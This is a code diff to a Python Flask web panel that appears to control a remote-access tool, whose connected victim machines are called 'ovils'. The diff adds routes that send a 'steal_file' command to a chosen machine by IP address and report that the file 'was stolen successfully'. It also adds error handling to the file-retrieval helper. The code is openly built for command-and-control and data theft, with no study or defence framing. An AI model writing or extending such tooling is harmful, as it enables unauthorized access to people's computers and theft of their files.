@@ -325,6 +325,10 @@ def get_file(ovil: Client, filename: str) -> Tuple[bool, str]:
     retur a tuple of whether succeded and the filename if succeded or error massage
     """
     succ, msg = ovil.send_command("steal_file", [filename])
+    if msg.startswith(":Error: "):
+        msg = msg[8::]
+    if succ.startswith(":Error: "):
+        succ = succ[8::]
     if succ == Massages.OK.value:
         return True, msg
     elif succ == Massages.NOT_OK.value:
@@ -499,6 +503,30 @@ def show_files(ip, page):
     ovil = ovils[ovils.index(ip)]
     result = ovil.send_command("show_files", [path])
     return result.replace(",", "\n")
+
+
+@app.route("/ovil/<ip>/steal_file/")
+@handle_errors
+def steal_files_page(ip):
+    return render_template("steal_files.html")
+
+
+@app.route("/ovil/<ip>/steal_file/steal/")
+@handle_errors
+@handle_disconnection
+def steal_file(ip):
+    path = request.args.get("path")
+    ovil = ovils[ovils.index(ip)]
+    status, filename = get_file(ovil, path)
+    if status:
+        return f"the file '{path}' was stolen successfully and was saved in '{filename}'"
+    else:
+        error_msg = filename
+        if error_msg == Massages.NOT_OK.value:
+            return "Unknown error"
+        return error_msg
+
+
 
 
 def main():
